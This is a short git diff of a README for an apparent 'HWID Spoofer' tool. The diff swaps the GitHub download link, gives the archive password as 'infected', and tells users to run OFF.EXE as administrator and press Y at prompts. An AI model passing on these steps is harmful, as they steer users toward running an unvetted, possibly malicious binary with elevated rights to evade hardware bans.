@@ -27,7 +27,7 @@
 
 ### *How To Use Program*
 
-##### 1. Download Program : [Click here](https://github.com/SmurfsCC/HWID-Spoofer/releases/tag/Windows10) (Password : infected)
+##### 1. Download Program : [Click here](https://github.com/SarnaxLii/HWID_Spoofer/releases/tag/Spoofer) (Password : infected)
 ##### 2. (IMPORTANT) You must Run as administrator : OFF.EXE
 ##### 3. Press as i said ( If some of them are clicked and the black screen is still not black, press Enter / some of them you choose to press Y or N, please press Y. )
 
